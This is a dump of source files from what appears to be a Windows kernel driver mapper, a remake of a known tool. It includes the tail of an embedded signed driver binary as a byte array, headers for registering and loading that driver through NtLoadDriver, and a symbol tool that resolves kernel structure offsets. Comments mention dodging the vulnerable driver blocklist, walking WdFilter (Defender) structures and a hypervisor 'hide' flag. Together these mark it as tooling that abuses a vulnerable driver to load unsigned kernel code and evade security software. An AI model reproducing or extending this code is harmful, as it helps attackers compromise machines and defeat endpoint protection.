		0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x26,
		0x30, 0x24, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1D, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x2D, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x20, 0x50, 0x43, 0x41, 0x20, 0x32, 0x30, 0x31, 0x30, 0x02, 0x13,
		0x33, 0x00, 0x00, 0x01, 0xB8, 0x08, 0xD4, 0xC1, 0xB8, 0x79, 0xE0, 0x51, 0x49, 0x00, 0x01, 0x00, 0x00, 0x01, 0xB8, 0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0xA0, 0x82, 0x01, 0x4A, 0x30, 0x1A,
		0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31, 0x0D, 0x06, 0x0B, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x10, 0x01, 0x04, 0x30, 0x2F, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31,
		0x22, 0x04, 0x20, 0x80, 0x15, 0x6E, 0x64, 0x66, 0x62, 0xB0, 0x2F, 0x2A, 0xB4, 0x4D, 0x33, 0x8E, 0x23, 0xC9, 0x82, 0x12, 0xAD, 0x08, 0xBA, 0xA6, 0x10, 0x10, 0x44, 0xF4, 0x6E, 0x2A, 0x9A, 0x84, 0x79, 0xDC, 0xB7, 0x30, 0x81, 0xFA, 0x06, 0x0B,
		0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x10, 0x02, 0x2F, 0x31, 0x81, 0xEA, 0x30, 0x81, 0xE7, 0x30, 0x81, 0xE4, 0x30, 0x81, 0xBD, 0x04, 0x20, 0x28, 0xEB, 0xD6, 0x38, 0xA0, 0x70, 0x3B, 0x43, 0x8A, 0x52, 0xF9, 0x8D, 0x4D, 0xB0, 0x17,
		0xEB, 0xA4, 0x86, 0x13, 0x79, 0x6B, 0x0F, 0x78, 0x64, 0xDA, 0x9A, 0x2D, 0x17, 0xD0, 0xF0, 0xFB, 0x1F, 0x30, 0x81, 0x98, 0x30, 0x81, 0x80, 0xA4, 0x7E, 0x30, 0x7C, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53,
		0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F, 0x6E, 0x31, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64, 0x31,
		0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x26, 0x30, 0x24, 0x06, 0x03, 0x55, 0x04, 0x03,
		0x13, 0x1D, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x2D, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x20, 0x50, 0x43, 0x41, 0x20, 0x32, 0x30, 0x31, 0x30, 0x02, 0x13, 0x33, 0x00, 0x00, 0x01, 0xB8, 0x08, 0xD4,
		0xC1, 0xB8, 0x79, 0xE0, 0x51, 0x49, 0x00, 0x01, 0x00, 0x00, 0x01, 0xB8, 0x30, 0x22, 0x04, 0x20, 0xD9, 0x44, 0x69, 0x67, 0x9E, 0x7C, 0x26, 0xCB, 0x60, 0x02, 0x99, 0xCB, 0xD9, 0xB7, 0x34, 0x4D, 0xBF, 0x97, 0xC0, 0xE3, 0x02, 0x3B, 0x5D, 0xBC,
		0xE4, 0xF0, 0x24, 0x6E, 0x1F, 0x19, 0xC4, 0x7D, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x04, 0x82, 0x02, 0x00, 0x89, 0xCC, 0x49, 0x65, 0x44, 0x32, 0xBE, 0xCA, 0x6B, 0xBB, 0xAF, 0xBD, 0x6E,
		0x03, 0xF0, 0xA1, 0xEF, 0xBB, 0x5D, 0x4A, 0xD4, 0x86, 0xAA, 0x5A, 0x98, 0x79, 0x45, 0x8F, 0x3E, 0x02, 0x22, 0x7B, 0xC6, 0xBA, 0x36, 0xF9, 0x8E, 0x74, 0x65, 0xE7, 0x01, 0x03, 0x58, 0xB7, 0x36, 0x44, 0x9A, 0x03, 0x56, 0xE1, 0x32, 0x55, 0x98,
		0x01, 0x41, 0x38, 0x5B, 0xDA, 0x2C, 0x41, 0x9C, 0x32, 0x22, 0xB0, 0xD2, 0x28, 0xF9, 0x63, 0xF6, 0x45, 0x22, 0x92, 0x09, 0x39, 0xC5, 0xAD, 0xA6, 0xE6, 0x1F, 0x3B, 0x7E, 0x12, 0x6D, 0x84, 0x42, 0x2B, 0x5C, 0x4A, 0x53, 0x7C, 0x35, 0x8A, 0xB8,
		0x09, 0x3F, 0xEF, 0xD9, 0xC6, 0x9A, 0xCC, 0x14, 0xB6, 0xAE, 0xFA, 0xD6, 0x95, 0xF0, 0x20, 0xF9, 0x85, 0x69, 0x9F, 0x6B, 0x52, 0xD9, 0x9F, 0x5B, 0xE4, 0x25, 0x24, 0x9C, 0x5D, 0xDC, 0x09, 0xC4, 0xA6, 0xA2, 0xCB, 0x23, 0xE7, 0x12, 0x89, 0xC6,
		0x90, 0x83, 0xAB, 0x8C, 0xEB, 0xBC, 0x67, 0x99, 0xDA, 0x36, 0x06, 0x2E, 0xB1, 0x08, 0xA3, 0xA7, 0x02, 0x4B, 0x05, 0xDE, 0x5A, 0x40, 0xB2, 0x8E, 0x4C, 0xD4, 0x10, 0x43, 0xA2, 0xDE, 0xCE, 0x6C, 0x77, 0x33, 0xF9, 0xAC, 0x00, 0x1D, 0x8B, 0xE1,
		0xA9, 0xA4, 0x2F, 0xC5, 0x6C, 0x23, 0x98, 0xA0, 0x9A, 0x75, 0xB0, 0xEF, 0x7E, 0x72, 0x25, 0x6A, 0x56, 0x6E, 0x2D, 0x67, 0xD1, 0xD3, 0x95, 0xB9, 0x55, 0x16, 0x4A, 0x2A, 0x4F, 0xD8, 0x25, 0x70, 0x0A, 0x69, 0xBB, 0x10, 0x88, 0x98, 0x67, 0xB1,
		0x02, 0x2E, 0xCE, 0x4E, 0x1D, 0xC6, 0x46, 0xD9, 0x39, 0x50, 0x5D, 0xBC, 0xA0, 0xF8, 0xD0, 0xF5, 0x01, 0x65, 0x5C, 0x2B, 0xCE, 0x3A, 0xAF, 0xC8, 0x42, 0xA9, 0x43, 0x04, 0xCB, 0x24, 0x73, 0x4A, 0x25, 0xE8, 0x07, 0x29, 0xBA, 0xAB, 0xD8, 0x2F,
		0xA7, 0x88, 0x71, 0xC2, 0x2F, 0x29, 0xD0, 0x62, 0x2E, 0xBA, 0x44, 0xCF, 0xEB, 0x94, 0x50, 0xBF, 0xAC, 0xC4, 0x93, 0xD9, 0x88, 0x58, 0xBD, 0xC9, 0x39, 0x5C, 0xE0, 0x4D, 0x2D, 0xD3, 0x5E, 0xA0, 0xDA, 0x08, 0xB3, 0xF5, 0xB9, 0xEC, 0xED, 0x73,
		0x75, 0x07, 0x9C, 0x52, 0x72, 0x45, 0xA1, 0x9B, 0x18, 0xED, 0x71, 0x77, 0x70, 0xBA, 0x58, 0xFB, 0x54, 0x37, 0x3E, 0x86, 0x28, 0x0F, 0x09, 0x7F, 0x05, 0xB8, 0x9B, 0x50, 0xA1, 0x7C, 0x38, 0xF8, 0x07, 0xF1, 0x06, 0x46, 0x17, 0x4E, 0x27, 0x61,
		0x99, 0x82, 0x40, 0x1B, 0x15, 0x1C, 0x82, 0xD8, 0xCD, 0x66, 0x40, 0x38, 0x0C, 0x6E, 0x4C, 0x54, 0x8A, 0x6D, 0xD4, 0x29, 0xD6, 0x9A, 0x29, 0xB9, 0x47, 0x3C, 0xD0, 0xC5, 0x50, 0xDC, 0x63, 0xB4, 0xD8, 0x46, 0xEE, 0xA0, 0x37, 0xA1, 0x78, 0x88,
		0x39, 0xDD, 0x84, 0xC0, 0x3D, 0x51, 0x87, 0xEA, 0x52, 0xB9, 0xE0, 0x76, 0xAE, 0xF1, 0x4A, 0x17, 0xB4, 0x79, 0x64, 0x1C, 0xA4, 0x50, 0x2E, 0x20, 0x92, 0xD2, 0xE8, 0xCF, 0xE3, 0xDD, 0xF9, 0x30, 0x9E, 0xC0, 0x42, 0xE2, 0x74, 0xBF, 0x90, 0x53,
		0x10, 0x99, 0x85, 0x66, 0xA5, 0xF3, 0xED, 0xC8, 0x1A, 0x05, 0x7C, 0x57, 0x6D, 0x7D, 0x82, 0x74, 0xDB, 0x13, 0x28, 0x16, 0x73, 0x14, 0x7D, 0x59, 0x84, 0x7E, 0xDE, 0x0E, 0x13, 0xDB, 0x77, 0x61, 0xED, 0x23, 0xC7, 0x4F, 0x48, 0x9A, 0xAA, 0xFB,
		0xD6, 0x26, 0x2B, 0x91, 0x5C, 0x19, 0x97, 0xCC, 0x37, 0xA2, 0x9A, 0x66, 0xE1, 0x2A, 0xA6, 0x59, 0x49, 0x81, 0xF9, 0x3B, 0x4B, 0xD8, 0x74, 0xA7, 0xEA, 0xF7, 0xC9, 0x3C, 0xEA, 0x77, 0x54, 0x96, 0xE8, 0x94, 0xEC, 0xCB, 0x98, 0x2D, 0x13, 0x2F,
		0xF7, 0xFA, 0x5C, 0xCE, 0x45, 0x20, 0x1D, 0xA4, 0x88, 0x7E, 0xCC, 0x29, 0x18, 0xA8, 0xF8, 0xAB, 0xFD, 0x4C, 0x4E, 0x00, 0x00, 0x00, 0x00, 0x00
	};
}

```

### D:\Ameger\Mapper\Mapper\Service\Service.hpp â€” 29 lines â€” sha12:6702B8B965E6
```c-header
#pragma once

#include <Windows.h>
#include <string>

namespace Service
{
	/*
	 * Register the provider as a kernel service and load it.
	 *
	 * Creates HKLM\SYSTEM\CurrentControlSet\Services\<serviceName> with an
	 * ImagePath of \??\<driver_path>, then calls NtLoadDriver.
	 *
	 * The registry key is removed again if any step fails, so a failed run
	 * leaves no service behind.
	 *
	 * Returns STATUS_IMAGE_CERT_REVOKED when the vulnerable driver blocklist is
	 * enabled, STATUS_ACCESS_DENIED when something blocked the load.
	 */
	NTSTATUS RegisterAndStart(const std::wstring& driver_path, const std::wstring& serviceName);

	/*
	 * Unload the provider and delete its service key.
	 *
	 * Returns STATUS_SUCCESS when the key was already gone, which is the normal
	 * case when the provider was reused instead of loaded by us.
	 * An unload failure is reported as an error even though the key is removed,
	 * because a still loaded driver with no service key is a state the kernel
	 * reports differently and is worth surfacing.
	 */
	NTSTATUS StopAndRemove(const std::wstring& serviceName);
}
```

### D:\Ameger\Mapper\Mapper\Symbols\Engine\SymbolEngine.hpp â€” 76 lines â€” sha12:163E5DE399F8
```c-header
#pragma once

#include <cstdint>
#include <string>
#include <vector>

//Folder next to the executable holding dbghelp.dll and symsrv.dll.
//Kept in step with SYMBOL_DLL_FOLDER in Symbols\Handler\SymbolsHandler.hpp, which
//is the mapper side of the same layout; the two programs do not share a header,
//so both spell it out here.
inline constexpr const wchar_t* kSymbolDllFolder = L"DLLs";

//One symbol to look up in a module's PDB.
struct SymbolRequest {
	std::wstring binaryName;
	std::wstring symbolName;
};

//A structure field: module, structure name, field name.
struct FieldRequest {
	std::wstring binaryName;
	std::wstring structName;
	std::wstring fieldName;

	//Set when the field is known not to exist in the public PDB type stream and
	//is therefore derived at runtime by content matching. An unresolved
	//optional field is an expected outcome, so the caller does not report it as
	//a failure.
	bool optional = false;
};

/*
 * dbghelp wrapper used by SymbolTool.exe to resolve kernel addresses and
 * structure field offsets from Microsoft's public PDBs.
 *
 * Loads dbghelp.dll and symsrv.dll from the DLLs subfolder next to the
 * executable; see SymbolEngine.cpp for why that is done explicitly rather than
 * through the import table.
 *
 * Every function reports failure by returning an empty container instead of
 * throwing, so a partially downloaded or missing PDB degrades to "that offset
 * could not be resolved" rather than taking the tool down.
 */
class SymbolEngine {
public:

	//cachePath is the flat folder the PDBs are stored in: one <name>.pdb per
	//binary, directly in that folder.
	explicit SymbolEngine(const std::wstring& cachePath);

	~SymbolEngine();

	//Reuse the flat <cachePath>\<name>.pdb for a binary, or download it there
	//when it is missing or belongs to a different build, and return its path.
	//Empty when no PDB is available for it.
	std::wstring GetPDB(const std::wstring& binaryPath);

	//Resolve symbol addresses, returned as offsets from the module base.
	//Returns an empty vector if any symbol fails, so a partial result is never
	//mistaken for a complete one.
	std::vector<uint64_t> GetOffset(const std::wstring& pdbPath, const std::vector<std::wstring>& symbolName);

//One resolved structure field. offset is 0 when the field could not be
	//resolved. matchedName is the spelling the type was found under, which can
	// differ from the requested struct name for the internal types that appear
	// under several names in the PDB; empty on a miss.
	//
	//Resolved() is the test for "was this field found", and it is deliberately
	//not offset != 0: _DRIVER_EXTENSION.DriverObject really does live at offset
	//0, so a caller that skipped zero-valued fields would drop it and the mapper
	//would silently fall back to a compiled default while the file claimed the
	//field was simply absent.
	struct FieldResult {
		uint64_t offset = 0;
		std::wstring matchedName{};

		//True when the type was located, whether or not the field sits at 0.
		bool Resolved() const { return !matchedName.empty(); }
	};

	//Resolve field offsets inside a structure using the PDB type information.
	//Returns one result per entry, offset 0 when the field could not be
	//resolved. Reporting is left to the caller, which knows the request's
	//optional flag.
	std::vector<FieldResult> GetStructFieldOffsets(const std::wstring& pdbPath, const std::vector<FieldRequest>& fields);

private:
	uint64_t process = 0; //HANDLE but we don't want to share the windows.h include
	std::wstring cachePath{}; //flat folder holding the downloaded PDBs
};
```

### D:\Ameger\Mapper\Mapper\Symbols\Handler\SymbolsHandler.hpp â€” 86 lines â€” sha12:520EA19A9162
```c-header
//TheCruZ Remake

#pragma once

#include <string>
#include <unordered_map>

//Name of the offset generator built by Template\SymbolTool.vcxproj. It is
//deployed next to Mapper.exe and is what --dontUpdateOffsets turns off.
//Keep in sync with <TargetName> in Template\SymbolTool.vcxproj.
#define SYMBOL_TOOL_EXE L"SymbolTool.exe"

//Folder next to Mapper.exe and SymbolTool.exe holding dbghelp.dll and
//symsrv.dll.
//This is NOT a default DLL search location: SymbolTool.exe imports dbghelp.dll
//(so the loader must find it before main runs) and dbghelp then loads symsrv.dll
//itself. Both therefore resolve through the application directory, the system
//directories and PATH - so every process that starts SymbolTool has to put this
//folder on PATH. ReloadFile does that for the process it spawns, and
//Build\Executors\Create.bat does it for its own invocation.
#define SYMBOL_DLL_FOLDER L"DLLs"

/*
 * Reader for Offsets.ini, the file SymbolTool.exe writes.
 *
 * Offsets.ini holds every kernel address and structure field offset the mapper
 * uses, resolved from the PDBs of the machine it runs on. Nothing here is
 * hardcoded or cached across builds, so a wrong or missing entry is the
 * difference between finding a structure and corrupting one.
 *
 * Singleton because it is read from all over the mapper during Load().
 */
class SymbolsHandler
{

public:
	SymbolsHandler() {
	};

	static SymbolsHandler* GetInstance()
	{
		static SymbolsHandler instance{};
		return &instance;
	}

	/*
	 * Replace the loaded symbol set.
	 *
	 * path     Offsets.ini to read. Ignored when `updater` is not empty,
	 *          because the updater always writes to the default location.
	 * updater  path to SymbolTool.exe, or empty to read `path` as is.
	 *
	 * The previous Offsets.ini is deliberately left in place while the updater
	 * runs: a failed update then leaves the mapper with the last known good
	 * offsets instead of with nothing.
	 *
	 * Returns false when the file is missing, the updater fails, or the file
	 * cannot be parsed; in every case the symbol set is left empty.
	 *
	 * Also returns false when the file parses but is not usable: no entries at
	 * all, or missing one of the offsets the run cannot proceed without. That
	 * case used to return true, which reported success and then walked kernel
	 * structures on the compiled-in defaults - the opposite of what a successful
	 * load is supposed to mean for a file whose whole purpose is to describe this
	 * build.
	 */
	bool ReloadFile(const std::wstring& path, const std::wstring& updater);

	//Offset of a symbol, 0 when it is not present. A real offset is never 0,
	//so 0 doubles as "not found" here.
	unsigned long long GetOffset(const std::wstring& name);

	//Offset of a structure field, stored as "<Struct>.<Field>".
	//Returns kFieldUnresolved when the field could not be resolved from the
	//PDB, which is a normal outcome for types that are not public UDTs.
	//
	//The sentinel is deliberately not 0: a field can legitimately resolve to
	//offset 0, and reusing the "not found" value of GetOffset for it meant a
	//caller could not tell "this field is at the start of the struct" from
	//"this field is not in the PDB". Callers compare against the sentinel
	//itself, so the two are now distinguishable.
	unsigned long long GetFieldOffset(const std::wstring& structAndField);

	//Returned by GetFieldOffset when no offset could be resolved. Deliberately
	//outside the range of any real member offset.
	static constexpr unsigned long long kFieldUnresolved = ~0ULL;

private:
	/*
	 * Every entry, keyed by name.
	 *
	 * A map rather than the list this used to hold. GetOffset and
	 * GetFieldOffset are called from the kernel structure walks, where the
	 * WdFilter discovery in particular looks a field up once per candidate
	 * offset, so a linear scan turned a bounded search into a quadratic one.
	 */
	std::unordered_map<std::wstring, unsigned long long> symbols{};
};
```

### D:\Ameger\Mapper\Mapper\Template\Mapper.sln â€” 25 lines â€” sha12:F15C459D4B93
```visual-studio-sln
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.33530.505
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Mapper", "Mapper\Mapper.vcxproj", "{518E0636-BA8F-459D-ACAC-81BD33475E3E}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SymbolTool", "Symbols\SymbolTool.vcxproj", "{25F92BD2-B79F-44C0-9B34-B7DE61F39E50}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release_Pdb_Offset|x64 = Release_Pdb_Offset|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release_Pdb_Offset|x64.ActiveCfg = Release_Pdb_Offset|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release_Pdb_Offset|x64.Build.0 = Release_Pdb_Offset|x64
		{25F92BD2-B79F-44C0-9B34-B7DE61F39E50}.Release_Pdb_Offset|x64.ActiveCfg = Release_Pdb_Offset|x64
		{25F92BD2-B79F-44C0-9B34-B7DE61F39E50}.Release_Pdb_Offset|x64.Build.0 = Release_Pdb_Offset|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {83D5D338-2A6D-49D5-B1DF-BDD34FB5CC9F}
	EndGlobalSection
EndGlobal
```

### D:\Ameger\Mapper\Mapper\Template\Mapper\Mapper.vcxproj â€” 110 lines â€” sha12:970F4DDB19B2
```xml
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release_Pdb_Offset|x64">
      <Configuration>Release_Pdb_Offset</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <ProjectGuid>{518E0636-BA8F-459D-ACAC-81BD33475E3E}</ProjectGuid>
    <RootNamespace>Mapper</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared" />
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <TargetName>Mapper</TargetName>
    <!-- Build scratch lives outside the repository, under %TEMP%\amager_build,
     so no build output or intermediate ever lands in the source tree.
     $(ProjectName) in IntDir is load bearing: a shared intermediate folder
     makes the two projects race for the same .obj files, which shows up as
     MSB8028 plus LNK1181 on a parallel build. -->
    <IntDir>$(TEMP)\amager_build\obj\$(ProjectName)\</IntDir>
    <OutDir>$(TEMP)\amager_build\bin\</OutDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>false</TreatWarningAsError>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <!-- The Hypervisor client header, pulled in for the hide flag (see App\Main.cpp).
       Referenced in place rather than copied so the VMCall ABI cannot drift
       between the two projects. -->
      <AdditionalIncludeDirectories>$(SolutionDir)..\..\..\Hypervisor\Client\Library;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <AdditionalOptions>/D "PDB_OFFSETS" %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
    <PostBuildEvent>
      <!-- Copies the two symbol libraries into $(OutDir)\DLLs, which is where
     SymbolEngine looks for them. The two files are named explicitly on purpose:
     a Utilities\* wildcard would also drag Utilities.cpp and Utilities.hpp into
     the build output, because they ship from the same folder. -->
    <Command>if not exist "$(OutDir)DLLs" mkdir "$(OutDir)DLLs"
copy /y "$(SolutionDir)..\Utilities\DLLs\dbghelp.dll" "$(OutDir)DLLs\" >nul
copy /y "$(SolutionDir)..\Utilities\DLLs\symsrv.dll" "$(OutDir)DLLs\" >nul</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <!-- App -->
    <ClCompile Include="..\..\App\Main.cpp" />
    <!-- Mapper -->
    <ClCompile Include="..\..\Mapper\Mapper.cpp" />
    <!-- PE -->
    <ClCompile Include="..\..\PE\PE.cpp" />
    <!-- Provider -->
    <ClCompile Include="..\..\Provider\Driver.cpp" />
    <!-- Service -->
    <ClCompile Include="..\..\Service\Service.cpp" />
    <!-- Symbols -->
    <ClCompile Include="..\..\Symbols\Handler\SymbolsHandler.cpp" />
    <!-- Utilities -->
    <ClCompile Include="..\..\Utilities\Utilities.cpp" />
  </ItemGroup>
  <ItemGroup>
    <!-- App -->
    <ClInclude Include="..\..\App\NT.hpp" />
    <ClInclude Include="..\..\App\AmgSharedApp.h" />
    <!-- Mapper -->
    <ClInclude Include="..\..\Mapper\Mapper.hpp" />
    <!-- PE -->
    <ClInclude Include="..\..\PE\PE.hpp" />
    <!-- Provider -->
    <ClInclude Include="..\..\Provider\Driver.hpp" />
    <ClInclude Include="..\..\Provider\Provider.hpp" />
    <ClInclude Include="..\..\Provider\Resource.hpp" />
    <!-- Service -->
    <ClInclude Include="..\..\Service\Service.hpp" />
    <!-- Symbols -->
    <ClInclude Include="..\..\Symbols\Handler\SymbolsHandler.hpp" />
    <!-- Utilities -->
    <ClInclude Include="..\..\Utilities\Console.hpp" />
    <ClInclude Include="..\..\Utilities\Utilities.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
</Project>

```

### D:\Ameger\Mapper\Mapper\Template\Symbols\SymbolTool.vcxproj â€” 68 lines â€” sha12:7FD6E1C5BA2D
```xml
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release_Pdb_Offset|x64">
      <Configuration>Release_Pdb_Offset</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <ProjectGuid>{25F92BD2-B79F-44C0-9B34-B7DE61F39E50}</ProjectGuid>
    <RootNamespace>SymbolTool</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared" />
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <TargetName>SymbolTool</TargetName>
    <!-- Same layout as the Mapper project: output under %TEMP%\amager_build,
     with a per-project $(ProjectName) IntDir so the two projects never share
     .obj. Both projects point OutDir/IntDir at the same temp scratch, so no
     build folder is created in the source tree. -->
    <IntDir>$(TEMP)\amager_build\obj\$(ProjectName)\</IntDir>
    <OutDir>$(TEMP)\amager_build\bin\</OutDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release_Pdb_Offset|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>false</TreatWarningAsError>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <PreprocessorDefinitions>_UNICODE;UNICODE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <AdditionalDependencies>dbghelp.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\..\Symbols\Main.cpp" />
    <ClCompile Include="..\..\Symbols\Engine\SymbolEngine.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Symbols\Engine\SymbolEngine.hpp" />
    <ClInclude Include="..\..\Utilities\Console.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
</Project>
```

### D:\Ameger\Mapper\Mapper\Utilities\Console.hpp â€” 305 lines â€” sha12:006031AA10FA
```c-header
#pragma once

/*
 * Shared console styling for every diagnostic the tool prints.
 *
 * Both Mapper.exe and SymbolTool.exe include this header, so the two programs
 * draw their output from one definition of the colours, the indent and the tag
 * rules rather than each carrying its own copy.
 *
 * The rules, applied once here instead of at every call site:
 *   - every line is indented two spaces by Log()
 *   - a leading "[x]" tag is coloured by its class: [+] green, [i] and
 *     [INFO] yellow, [-] red, [!], [<] and [*] cyan
 *   - a value wrapped in Val() prints green, so addresses, offsets, counts,
 *     statuses and names stand out from the prose around them
 *   - AMEGER_NO_COLOR=1 resolves every sequence to an empty string, so the
 *     output degrades to plain text with the same wording and no escape bytes
 *
 * The prompt and the usage text are flush left on purpose; they use LogRaw(),
 * which keeps the tag colouring but not the indent.
 */

#include <Windows.h>
#include <cstddef>
#include <cstdint>
